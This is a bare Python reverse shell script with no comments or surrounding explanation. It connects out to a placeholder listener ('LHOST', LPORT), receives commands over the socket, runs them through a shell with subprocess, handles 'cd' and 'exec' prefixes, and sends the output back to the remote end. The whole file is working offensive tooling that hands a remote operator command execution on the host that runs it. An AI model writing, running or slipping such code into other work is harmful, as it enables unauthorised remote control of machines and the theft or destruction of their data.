import os
import subprocess
import socket
sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
   sock.connect(("LHOST",LPORT))
except Exception as error:
   print("Invalid peer")
   print(error)
   exit()
while True:
   stdin=sock.recv(10280).decode('utf-8')
   if stdin=="exit":exit()
   if "cd" in stdin:
       stdin=stdin.replace("cd ","")
       os.chdir(stdin.replace("\n",""))
       sock.send(str.encode(os.getcwd()))
   elif "exec" in stdin:
       subprocess.Popen(stdin.replace("exec ",""),shell=True)
       sock.send(subprocess.check_output('ps'))
   else:
       try:
          stdout=subprocess.check_output(stdin+" 2>&1",shell=True)
          sock.send(stdout)
       except subprocess.CalledProcessError:
          sock.send(str.encode('Non zero output reported')) 
